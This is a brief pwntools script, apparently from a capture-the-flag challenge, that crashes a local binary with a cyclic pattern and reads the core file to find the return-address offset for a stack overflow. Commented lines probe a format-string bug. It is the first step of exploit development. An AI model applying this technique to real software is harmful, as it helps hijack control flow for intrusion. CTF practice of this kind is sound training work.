from pwn import *

#io = remote("challenges.france-cybersecurity-challenge.fr", 2050)

#pl = cyclic(36)
#pl += cyclic(cyclic_find(0x004011a2))

io = process("./pwn")

#print(io.recvline())#b'\n'))
#io.sendline(b’%p,%p,%p’)
#io.recvline()
#print(io.recvline())
io.sendline(cyclic(500))
io.wait()
core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
rip_offset = cyclic_find(pattern)
info("rip offset is %d", rip_offset)
